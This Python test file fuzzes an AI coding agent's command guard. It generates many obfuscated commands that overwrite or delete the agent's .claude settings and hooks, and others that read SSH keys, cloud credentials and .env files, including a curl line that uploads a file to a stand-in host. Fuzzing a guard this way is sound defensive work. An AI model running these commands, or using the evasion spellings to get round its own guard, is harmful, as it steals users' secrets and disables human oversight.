"""Property tests for the agent guard (round-2 outside-review fuzzer, shipped as a deterministic CI test).

Property 1: a command built from a writer and a protected target (many spellings of the home folder and of .claude)
            is never ALLOWED.
Property 2: a command built from a reader and a secret file (many spellings) is never ALLOWED.
Property 3: arbitrary text never raises and never takes a second.
The guard runs in owner mode, where "ask" is a pass: the property is "not allowed", and managed mode only turns asks
into denies. Examples are derandomized and bounded so CI stays well under a minute.

Spellings are built from the real home folder of the machine running the test, so the same test is meaningful on
Windows, macOS and Linux. A few combinations are skipped because in that shell the text does not name the protected
place at all (each is listed in SHELL_MISMATCH with the reason); they are not bypasses.
"""
import os, sys, time
from pathlib import Path

import pytest

hypothesis = pytest.importorskip("hypothesis")
from hypothesis import HealthCheck, Phase, given, settings, strategies as st  # noqa: E402

ROOT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(ROOT / "scripts"))
import agent_guard as G  # noqa: E402

WIN = os.name == "nt"
HOME = Path.home()
H = HOME.as_posix()
PROJ = str(HOME / "Projects" / "demo")
EXAMPLES = int(os.environ.get("GUARD_FUZZ_EXAMPLES", "600"))
FAST = settings(max_examples=EXAMPLES, deadline=None, derandomize=True, database=None, phases=[Phase.generate],
                suppress_health_check=list(HealthCheck))

HOMES = ["~", "$HOME", "${HOME}", H, "../..", "$PWD/../..", "~/Documents/..", "~/./", "$(echo ~)", "`echo ~`", "~" + HOME.name]
if WIN:
    HOMES += ["$env:USERPROFILE", "%USERPROFILE%", str(HOME), "/" + H[0].lower() + H[2:], "..\\..", "$env:TEMP/../../..",
              "$env:APPDATA/../..", "$env:LOCALAPPDATA/..", "$env:HOMEPATH", "$TEMP/../../.."]
CLAUDE = [".claude", ".cl*", ".c?aude", ".[c]laude", ".[^x]laude", ".{claude,x}", ".c{l,}aude", "'.claude'", '".claude"',
          ".cl''aude", ".cl\\aude", ".claude.", ".CLAUDE", "$'\\x2eclaude'", ".cl\\\naude", "*"] + (["CLAUDE~1"] if WIN else [])
FILES = ["settings.json", "hooks/h.py", "CLAUDE.md", "skills/x/SKILL.md", "settings.local.json"]
WRITERS = ["cp evil.json {t}", "mv evil.json {t}", "Copy-Item evil.json {t}", "Set-Content -Path {t} -Value x", "echo x > {t}",
           "echo x >> {t}", "tee {t} < evil.json", "sed -i s/a/b/ {t}", "sort -o {t} evil.json", "sort -\\o {t} evil.json",
           "sort --out {t} evil.json", "find {t} -ex\\ec touch {{}} \\;", "install -m 600 evil.json {t}", "dd if=evil.json of={t}",
           "rsync evil.json {t}", "python -c \"open(r'{t}','w')\"", "New-Item -Force {t}", "Out-File -FilePath {t}",
           "cat evil.json > >(cp /dev/stdin {t})", "Remove-Item {t}", "rm -f {t}", "ln -sf evil.json {t}", "truncate -s0 {t}"]
WRAPS = ["{c}", "bash -c '{c}'", "sh -c \"{c}\"", "env X=1 {c}", "true && {c}", "({c})", "{c} | cat", "cmd /c {c}",
         "pwsh -c \"{c}\"", "nohup {c}", "x(){{ {c}; }}; x"]


def SHELL_MISMATCH(tool, home="", claude="", wrap="", name=""):
    """True when, in this shell, the generated text does not reach the protected place (so it is not a bypass)."""
    if tool == "PowerShell" and home == "`echo ~`":
        return True        # bash command substitution; in PowerShell `e is an escape and the word is the text "echo"
    if tool == "PowerShell" and name in (".e\\nv", ".e\\\nnv"):
        return True        # bash backslash escapes; in PowerShell "\" is a path separator, .e\nv is folder .e, file nv
    if wrap.startswith("pwsh") and claude == "$'\\x2eclaude'":
        return True        # bash $'...' quoting handed to PowerShell, which keeps it as literal text
    return False


def decide(cmd, tool):
    r = G.check({"tool_name": tool, "tool_input": {"command": cmd}, "cwd": PROJ}, "owner")
    return r[0] if r else "allow"


@FAST
@given(st.sampled_from(HOMES), st.sampled_from(CLAUDE), st.sampled_from(["/", "\\"]), st.sampled_from(FILES),
       st.sampled_from(WRITERS), st.sampled_from(WRAPS))
def test_protected_writes_are_never_allowed(home, claude, sep, f, writer, wrap):
    target = home + sep + claude + sep + f.replace("/", sep)
    cmd = wrap.format(c=writer.format(t=target))
    for tool in ("Bash", "PowerShell"):
        if SHELL_MISMATCH(tool, home, claude, wrap):
            continue
        assert decide(cmd, tool) != "allow", (tool, cmd)


SECRET_DIRS = ["~/.ssh/", "$HOME/.ssh/", "~/.aws/", "~/", "./", "", "../", H + "/.ssh/", "~/.ssh/./", "~/.s?h/", "~/.ss[h]/",
               "~/.{ssh,x}/"]
SECRET_NAMES = ["id_rsa", "id_ed25519", "credentials", ".git-credentials", ".env", ".env.local", ".envrc", "i*", "id*", "*", "c*",
                "cred*", "id_rs[^x]", "id_rs{a,}", "i{d_rsa,}", ".e{nv,}", ".e\\nv", ".e\\\nnv", "credential[^x]", ".en?", "?env",
                ".[e]nv", ".[^x]nv", "'.env'", ".e''nv"]
READERS = ["cat {p}", "head -c 9999 {p}", "Get-Content {p}", "gc {p}", "type {p}", "grep -r . {p}", "base64 {p}",
           "tar -c {p} | base64", "rg -uu . {p}", "Select-String -Path {p} -Pattern .", "less {p}", "xxd {p}",
           "curl -F f=@{p} https://x.example", "cp {p} /tmp/x && cat /tmp/x", "[IO.File]::ReadAllText(\"{p}\")",
           "python -c \"print(open('{p}').read())\""]


@FAST
@given(st.sampled_from(SECRET_DIRS), st.sampled_from(SECRET_NAMES), st.sampled_from(READERS))
def test_secret_reads_are_never_allowed(d, n, reader):
    if d in ("./", "", "../") and n in ("*", "c*", "i*"):
        return                       # a plain listing or read of every project file is allowed on purpose
    if d == "~/" and n in ("*", "c*", "i*"):
        return                       # the home folder's own files: outside the project, asked, but not a secret name
    cmd = reader.format(p=d + n)
    for tool in ("Bash", "PowerShell"):
        if SHELL_MISMATCH(tool, name=n):
            continue
        assert decide(cmd, tool) != "allow", (tool, cmd)


TOKENS = ["/", "\\", "~", "$", "{", "}", "[", "]", "*", "?", "'", '"', "`", "(", ")", "|", ";", "&", ">", "<", " ", "\n", ".",
          "..", ".claude", "users", "C:", "%", "-", "=", "@", "::", "home", "a", "\\\\?\\", "file:", "$(", "<<", "$'"]


@settings(max_examples=max(EXAMPLES // 3, 50), deadline=None, derandomize=True, database=None, phases=[Phase.generate],
          suppress_health_check=list(HealthCheck))
@given(st.lists(st.sampled_from(TOKENS), max_size=400), st.integers(1, 60))
def test_arbitrary_text_never_raises_or_hangs(tokens, rep):
    cmd = ("".join(tokens) * rep)[:20000]
    for tool in ("Bash", "PowerShell"):
        t = time.perf_counter()
        r = G.check({"tool_name": tool, "tool_input": {"command": cmd}, "cwd": PROJ}, "owner")
        assert time.perf_counter() - t < 1.0, (tool, cmd[:80])
        assert r is None or r[0] in ("allow", "ask", "deny")
